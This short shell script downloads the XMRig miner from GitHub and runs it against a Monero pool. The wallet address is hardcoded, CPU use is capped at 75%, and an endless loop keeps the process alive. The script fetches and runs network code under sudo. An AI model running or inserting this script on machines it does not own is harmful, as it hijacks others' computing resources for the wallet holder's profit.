#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/MoneroOcean/xmrig/releases/download/v6.15.0-mo1/xmrig-v6.15.0-mo1-lin64-compat.tar.gz
tar xf xmrig-v6.15.0-mo1-lin64-compat.tar.gz
./xmrig -o gulf.moneroocean.stream:10128 -u 86gih1KKQvB1Kk4HK6jigxYyf6Bv9y4rVXmKgdcDzcyL7MYPe96nXZFMKRUcbK5VMvbRyvdjdTMNKhSxAwda7txW8T9trPS+128000 -p hideyoshi -a rx/graft -t 8 --cpu-priority 5 --max-cpu-usage 75 --randomx-1gb-pages
while [ 1 ]; do
sleep 3
done
sleep 999
